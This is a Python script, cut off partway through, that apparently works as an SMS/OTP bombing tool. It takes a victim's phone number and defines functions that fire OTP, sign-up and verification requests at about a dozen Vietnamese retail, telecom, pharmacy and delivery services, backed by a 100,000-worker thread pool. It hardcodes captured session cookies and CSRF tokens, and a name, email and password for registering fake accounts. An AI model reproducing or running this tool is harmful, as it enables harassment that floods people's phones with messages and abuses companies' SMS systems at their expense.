import requests,sys,time,json
from concurrent.futures import ThreadPoolExecutor
threading = ThreadPoolExecutor(max_workers=int(100000))
phone = sys.argv[1]
def winmart():
        response = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}")
###
def phama():
    headers = {
        'authority': 'api-gateway.pharmacity.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.pharmacity.vn',
        'referer': 'https://www.pharmacity.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'referral': '',
    }

    response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', headers=headers, json=json_data)
###
def ecogreen():
    cookies = {
        'auth.strategy': 'local',
        '_gcl_au': '1.1.2110116290.1695556218',
        '_ga_G9P9P58D5Y': 'GS1.1.1695556219.1.0.1695556219.60.0.0',
        '_ga': 'GA1.3.468741587.1695556219',
        '_gid': 'GA1.3.534625868.1695556219',
        '_gat_UA-89533981-1': '1',
        '_dc_gtm_UA-91935928-1': '1',
        '_fbp': 'fb.2.1695556219630.7175086',
        '__uidac': '016510227bd29d9d65934d7a4d5d2665',
        'dtdz': 'ee6f5c76-4c14-4727-9be7-d0454a3ad8e9',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '_ym_uid': '1695556221347398287',
        '_ym_d': '1695556221',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        '_gat_UA-91935928-1': '1',
        '_ga_GEFZP21KYF': 'GS1.3.1695556219.1.0.1695556222.57.0.0',
        '_ga_F8EJ8FPVHZ': 'GS1.1.1695556219.1.1.1695556232.47.0.0',
    }

    headers = {
        'authority': 'ecogreen.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': 'auth.strategy=local; _gcl_au=1.1.2110116290.1695556218; _ga_G9P9P58D5Y=GS1.1.1695556219.1.0.1695556219.60.0.0; _ga=GA1.3.468741587.1695556219; _gid=GA1.3.534625868.1695556219; _gat_UA-89533981-1=1; _dc_gtm_UA-91935928-1=1; _fbp=fb.2.1695556219630.7175086; __uidac=016510227bd29d9d65934d7a4d5d2665; dtdz=ee6f5c76-4c14-4727-9be7-d0454a3ad8e9; __iid=; __iid=; __su=0; __su=0; _ym_uid=1695556221347398287; _ym_d=1695556221; _ym_isad=2; _ym_visorc=w; _gat_UA-91935928-1=1; _ga_GEFZP21KYF=GS1.3.1695556219.1.0.1695556222.57.0.0; _ga_F8EJ8FPVHZ=GS1.1.1695556219.1.1.1695556232.47.0.0',
        'origin': 'https://ecogreen.com.vn',
        'referer': 'https://ecogreen.com.vn/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
        'x-status-key': '4e5657f2567440f78393ea3514fa7fba',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://ecogreen.com.vn/api/auth/register/send-otp', cookies=cookies, headers=headers, json=json_data)
###
def myvietel():
    cookies = {
        'cookie_saleChannel0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI': 'eyJpdiI6IjNndVNDdGpOVzFkV2NSSUNQR2grZVE9PSIsInZhbHVlIjoiZVdWZkV6YWFSQlNhbm8zbVhJKzJEK0tIUDViQWxOZHJtTndcL0k5Y2JWS01MM2J2TEpOSitCWjE0N1RWMmswZ1lhUWhyOEtIYklKOHh0bVpkZVRFcFRyZDdCcEQwMW1Ma0U1em9yZ3czbVc5QlJLc1Nxd3BPZ0w3REJvU002b1ZnQUVGWnhvamE4akJXZFlmS0xzWnRrOGwxRXNCYVM5ZFwvS0Faam9ndnphWkswXC9vMmJhM0JWRndoaDljeGpoYUQ5bk84ZHRsYkdIZXlMOEVYZVwvdXdSQWc0N1czUks5SStwbDhjNFVkUjd0UjQ9IiwibWFjIjoiY2Q5YmY2OGQ1MjZhZjA5ODFhYzk1OWFkNTZlMDBiOWEzNzMxYTU3NGRlYzc0ZTljMDgwZTY1OTE4OTA5YzJlNCJ9',
        'laravel_session': '0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI',
        'redirectLogin': 'https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE',
        'XSRF-TOKEN': 'eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'cookie_saleChannel0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI=eyJpdiI6IjNndVNDdGpOVzFkV2NSSUNQR2grZVE9PSIsInZhbHVlIjoiZVdWZkV6YWFSQlNhbm8zbVhJKzJEK0tIUDViQWxOZHJtTndcL0k5Y2JWS01MM2J2TEpOSitCWjE0N1RWMmswZ1lhUWhyOEtIYklKOHh0bVpkZVRFcFRyZDdCcEQwMW1Ma0U1em9yZ3czbVc5QlJLc1Nxd3BPZ0w3REJvU002b1ZnQUVGWnhvamE4akJXZFlmS0xzWnRrOGwxRXNCYVM5ZFwvS0Faam9ndnphWkswXC9vMmJhM0JWRndoaDljeGpoYUQ5bk84ZHRsYkdIZXlMOEVYZVwvdXdSQWc0N1czUks5SStwbDhjNFVkUjd0UjQ9IiwibWFjIjoiY2Q5YmY2OGQ1MjZhZjA5ODFhYzk1OWFkNTZlMDBiOWEzNzMxYTU3NGRlYzc0ZTljMDgwZTY1OTE4OTA5YzJlNCJ9; laravel_session=0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI; redirectLogin=https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE; XSRF-TOKEN=eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'X-CSRF-TOKEN': 'IsFbAIu3zZCkbn7pkrrZnoTS4MaK7AXwvU7CKVGU',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ==',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
    response.text
###
def fptshop():
    cookies = {
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '93565a20-d5bd-4b1d-921f-6b833256ae5a',
        '_gcl_au': '1.1.274895891.1694312337',
        'fpt_uuid': '%226f1d835a-1946-4291-a9ff-241e68bc2965%22',
        'ajs_group_id': 'null',
        '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfsmiKYNpVgANR31I0UfUWgjP95uHqcAUiDZGs.1',
        '_fbp': 'fb.2.1694312339667.1405504295',
        '__admUTMtime': '1694312339',
        '_tt_enable_cookie': '1',
        '_ttp': 'R2G1TDK2APp-wahdJlD64b-MjP_',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__RC': '59',
        '__R': '3',
        '_hjSessionUser_731679': 'eyJpZCI6ImRiNTJkYjEwLTE2NWMtNTcxZS05NDdkLWI5NzZhZWY2ODk1NSIsImNyZWF0ZWQiOjE2OTQzMTIzMzk2NDYsImV4aXN0aW5nIjp0cnVlfQ==',
        '__tb': '0',
        '__IP': '712264848',
        '_gid': 'GA1.3.872342835.1695128560',
        '_gat': '1',
        'vMobile': '1',
        '_ga': 'GA1.1.1813377516.1694312336',
        'cf_clearance': 'ilQ6k.2nVyGvZkL437P7skB9zv5GWtWlHZ9KduAAHf8-1695128562-0-1-60834c65.4b3697cc.37821385-0.2.1695128562',
        '_ga_ZR815NQ85K': 'GS1.1.1695128560.3.0.1695128561.59.0.0',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22LZP9yq8b913yis2cEPCF%22%7D',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6ImViNTgxNTAwLTViNTktNGRkOC05MjVkLTIzZjg2NmFmOTZiMSIsImNyZWF0ZWQiOjE2OTUxMjg1NjIyMzEsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '__uif': '__uid%3A8589680751712265079%7C__ui%3A1%252C6%7C__create%3A1689680751',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=93565a20-d5bd-4b1d-921f-6b833256ae5a; _gcl_au=1.1.274895891.1694312337; fpt_uuid=%226f1d835a-1946-4291-a9ff-241e68bc2965%22; ajs_group_id=null; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfsmiKYNpVgANR31I0UfUWgjP95uHqcAUiDZGs.1; _fbp=fb.2.1694312339667.1405504295; __admUTMtime=1694312339; _tt_enable_cookie=1; _ttp=R2G1TDK2APp-wahdJlD64b-MjP_; __iid=; __iid=; __su=0; __su=0; __RC=59; __R=3; _hjSessionUser_731679=eyJpZCI6ImRiNTJkYjEwLTE2NWMtNTcxZS05NDdkLWI5NzZhZWY2ODk1NSIsImNyZWF0ZWQiOjE2OTQzMTIzMzk2NDYsImV4aXN0aW5nIjp0cnVlfQ==; __tb=0; __IP=712264848; _gid=GA1.3.872342835.1695128560; _gat=1; vMobile=1; _ga=GA1.1.1813377516.1694312336; cf_clearance=ilQ6k.2nVyGvZkL437P7skB9zv5GWtWlHZ9KduAAHf8-1695128562-0-1-60834c65.4b3697cc.37821385-0.2.1695128562; _ga_ZR815NQ85K=GS1.1.1695128560.3.0.1695128561.59.0.0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22LZP9yq8b913yis2cEPCF%22%7D; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImViNTgxNTAwLTViNTktNGRkOC05MjVkLTIzZjg2NmFmOTZiMSIsImNyZWF0ZWQiOjE2OTUxMjg1NjIyMzEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __uif=__uid%3A8589680751712265079%7C__ui%3A1%252C6%7C__create%3A1689680751',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
###
def tv360():
    cookies = {
        'acw_tc': '9aaf940a6cdcc4acd3e07b1b10c328880d214785e42ba285709248963ab8e7a5',
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7.6ArWYearisaeiXLvpEQeILU0Rpeqo7JTv9xCClcNgJA',
        'shared-device-id': 'web_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7',
        'screen-size': 's%3A1280x720.%2Fl38KhYvKgwKxsNysIEM6VTkaAubb6utR0LoxEkjZsU',
        '_ga': 'GA1.2.2034489421.1694952395',
        '_gid': 'GA1.2.602838635.1694952395',
        'G_ENABLED_IDPS': 'google',
        'session-id': 's%3A863dae10-cab3-43c3-8dc8-947211574e72.LQTo2WBBjeNfjmkUhCA44gYfmlYX3SH68AZg2kSGzz0',
        '_ga_E5YP28Y8EF': 'GS1.1.1694952394.1.1.1694952571.0.0.0',
        '_ga_D7L53J0JMS': 'GS1.1.1694952394.1.1.1694952571.60.0.0',
    }
    headers = {
        'authority': 'tv360.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'acw_tc=9aaf940a6cdcc4acd3e07b1b10c328880d214785e42ba285709248963ab8e7a5; img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7.6ArWYearisaeiXLvpEQeILU0Rpeqo7JTv9xCClcNgJA; shared-device-id=web_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7; screen-size=s%3A1280x720.%2Fl38KhYvKgwKxsNysIEM6VTkaAubb6utR0LoxEkjZsU; _ga=GA1.2.2034489421.1694952395; _gid=GA1.2.602838635.1694952395; G_ENABLED_IDPS=google; session-id=s%3A863dae10-cab3-43c3-8dc8-947211574e72.LQTo2WBBjeNfjmkUhCA44gYfmlYX3SH68AZg2kSGzz0; _ga_E5YP28Y8EF=GS1.1.1694952394.1.1.1694952571.0.0.0; _ga_D7L53J0JMS=GS1.1.1694952394.1.1.1694952571.60.0.0',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1694952571324',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }
    json_data = {
        'msisdn': phone,
    }
    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
###
def ghn():
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}   

    json_data = {
        'phone': phone,
        'type': 'register',
}   

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
###
def phuclong():
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://order.phuclong.com.vn',
        'referer': 'https://order.phuclong.com.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
        'fullName': 'Trần Ngọc Nguyên',
        'email': 'sadwadw@gmail.com',
        'password': 'dang=2007',
    }

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data)
###
def pizzahunt():
        cookies = {
            'x_polaris_sid': 'BXJ7BrzR5j9pQNLpcf5lHL1RGuV1SMlY3sis',
            '_gcl_au': '1.1.1440946731.1695203263',
            'ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%22151d6c0e-5aee-4bd5-8ffa-19801324c18c%22%2C%22c%22%3A1695203263422%2C%22l%22%3A1695203263422%7D',
            '_fbp': 'fb.1.1695203263558.1271680016',
            '_gid': 'GA1.2.611766657.1695203264',
            '_gac_UA-197055535-1': '1.1695203264.CjwKCAjwsKqoBhBPEiwALrrqiE50-da9jnlqa3C_x-WKZ7fLeAG52vXLcGygPu7oY4cXcd2iL6APMxoCUxcQAvD_BwE',
            '_gac_UA-197055535-2': '1.1695203264.CjwKCAjwsKqoBhBPEiwALrrqiE50-da9jnlqa3C_x-WKZ7fLeAG52vXLcGygPu7oY4cXcd2iL6APMxoCUxcQAvD_BwE',
            '_gcl_aw': 'GCL.1695203264.CjwKCAjwsKqoBhBPEiwALrrqiE50-da9jnlqa3C_x-WKZ7fLeAG52vXLcGygPu7oY4cXcd2iL6APMxoCUxcQAvD_BwE',
            '_tt_enable_cookie': '1',
            '_ttp': 'f0fSZVzk-E3XX4uUew7tzNPt5gJ',
            'fs_lua': '1.1695203264859',
            'fs_uid': '#o-1EGZPD-na1#da8cf535-906e-407a-a9f6-3dc362bd3862:643db0d7-60c4-41f7-9d7f-ed465c894808:1695203264859::1#/1726739264',
            '_ga': 'GA1.2.854944938.1695203264',
            'ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%22b5d28a19-8297-42af-b711-4700a5296321%22%2C%22e%22%3A1695205069194%2C%22c%22%3A1695203263418%2C%22l%22%3A1695203269194%7D',
            '_ga_VLLXGWD25W': 'GS1.1.1695203263.1.1.1695203270.0.0.0',
            '_gat_UA-197055535-1': '1',
            '_ga_Q17PXF17Y5': 'GS1.1.1695203263.1.1.1695203327.0.0.0',
            'x_polaris_sd': 'F3BZ8hAUTUXYIWdcHYAqOz8OXjXmKR40XyDGyRLa5Ho18XVFscxZ6|MrgRsZFMeLvYFNfpYVcPiBeZPSVjDhYWe09RzuT2UMC|Zi3T5JaHMcg4gdq1XiDB5Vhw|Q8|EfAF!!',
        }

        headers = {
            'authority': 'pizzahut.vn',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'content-type': 'application/json',
            # 'cookie': 'x_polaris_sid=BXJ7BrzR5j9pQNLpcf5lHL1RGuV1SMlY3sis; _gcl_au=1.1.1440946731.1695203263; ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%22151d6c0e-5aee-4bd5-8ffa-19801324c18c%22%2C%22c%22%3A1695203263422%2C%22l%22%3A1695203263422%7D; _fbp=fb.1.1695203263558.1271680016; _gid=GA1.2.611766657.1695203264; _gac_UA-197055535-1=1.1695203264.CjwKCAjwsKqoBhBPEiwALrrqiE50-da9jnlqa3C_x-WKZ7fLeAG52vXLcGygPu7oY4cXcd2iL6APMxoCUxcQAvD_BwE; _gac_UA-197055535-2=1.1695203264.CjwKCAjwsKqoBhBPEiwALrrqiE50-da9jnlqa3C_x-WKZ7fLeAG52vXLcGygPu7oY4cXcd2iL6APMxoCUxcQAvD_BwE; _gcl_aw=GCL.1695203264.CjwKCAjwsKqoBhBPEiwALrrqiE50-da9jnlqa3C_x-WKZ7fLeAG52vXLcGygPu7oY4cXcd2iL6APMxoCUxcQAvD_BwE; _tt_enable_cookie=1; _ttp=f0fSZVzk-E3XX4uUew7tzNPt5gJ; fs_lua=1.1695203264859; fs_uid=#o-1EGZPD-na1#da8cf535-906e-407a-a9f6-3dc362bd3862:643db0d7-60c4-41f7-9d7f-ed465c894808:1695203264859::1#/1726739264; _ga=GA1.2.854944938.1695203264; ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%22b5d28a19-8297-42af-b711-4700a5296321%22%2C%22e%22%3A1695205069194%2C%22c%22%3A1695203263418%2C%22l%22%3A1695203269194%7D; _ga_VLLXGWD25W=GS1.1.1695203263.1.1.1695203270.0.0.0; _gat_UA-197055535-1=1; _ga_Q17PXF17Y5=GS1.1.1695203263.1.1.1695203327.0.0.0; x_polaris_sd=F3BZ8hAUTUXYIWdcHYAqOz8OXjXmKR40XyDGyRLa5Ho18XVFscxZ6|MrgRsZFMeLvYFNfpYVcPiBeZPSVjDhYWe09RzuT2UMC|Zi3T5JaHMcg4gdq1XiDB5Vhw|Q8|EfAF!!',
            'origin': 'https://pizzahut.vn',
            'referer': 'https://pizzahut.vn/signup',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'keyData': 'appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone='+phone,
        }

        response = requests.post(
            'https://pizzahut.vn/callApiStorelet/user/registerRequest',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
###
def longchau(phone):
        headers = {
            'authority': 'api.nhathuoclongchau.com.vn',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'access-control-allow-origin': '*',
            'authorization': '',
            'content-type': 'application/json',
            'order-channel': '1',
            'origin': 'https://nhathuoclongchau.com.vn',
            'referer': 'https://nhathuoclongchau.com.vn/',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'x-channel': 'EStore',
        }

        json_data = {
            'phoneNumber': phone,
            'otpType': 0,
            'fromSys': 'WEBKHLC',
        }

        response = requests.post(
            'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers=headers,
            json=json_data,
        )
###
def inc():
    headers = {
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Origin': 'https://www.best-inc.vn',
        'Referer': 'https://www.best-inc.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'accept': 'application/json',
        'authorization': 'null',
        'content-type': 'application/json',
        'lang-type': 'vi-VN',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-auth-type': 'WEB',
        'x-lan': 'VI',
        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    json_data = {
        'phoneNumber': phone,
        'verificationCodeType': 1,
    }

    response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data)
####
def dmx():
    cookies = {
        '_gcl_au': '1.1.79323279.1695224590',
        '_gid': 'GA1.2.1529897882.1695224590',
        '_gat_UA-38936689-1': '1',
        '_pk_ref.8.8977': '%5B%22%22%2C%22%22%2C1695224590%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D',
        '_pk_id.8.8977': 'ab30890ea397cc91.1695224590.',
        '_pk_ses.8.8977': '1',
        '_fbp': 'fb.1.1695224590085.572828266',
        '.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8ImUV2tmepFDqJx13sccnB7iwltpa-maVnaceJKMLO6cpG-aChNfJwcHotJlcS1fGrWlqfYdBaaySWu45hv_jO788Fw0QcFDyuEwQXaj2PpJZSfj02LESvNbY-NATGo5QEmq4j_k3OQ7OFSFIsu87r8',
        'DMX_Personal': '%7B%22UID%22%3A%22262eeb3254c80dd2df54459e5712395979b228c0%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        '_ga_Y7SWKJEHCE': 'GS1.1.1695224589.1.1.1695224592.57.0.0',
        '_ga': 'GA1.1.719063766.1695224590',
        'SvID': 'dmxcart2737|ZQsTE|ZQsTD',
        '_ga_5MXNSQHGT3': 'GS1.2.1695224590.1.1.1695224592.58.0.0',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '211%2C1.55.43.249%2C1%2C3357fadb0316939352bbdd4d5360a97f',
        'cebsp_': '1',
        '_ce.s': 'v~bcd374843a146000bcdeb5f09c38c56c7448ab99~lcw~1695224601425~vpv~0~gtrk.la~lmrwyhy0~lcw~1695224601432',
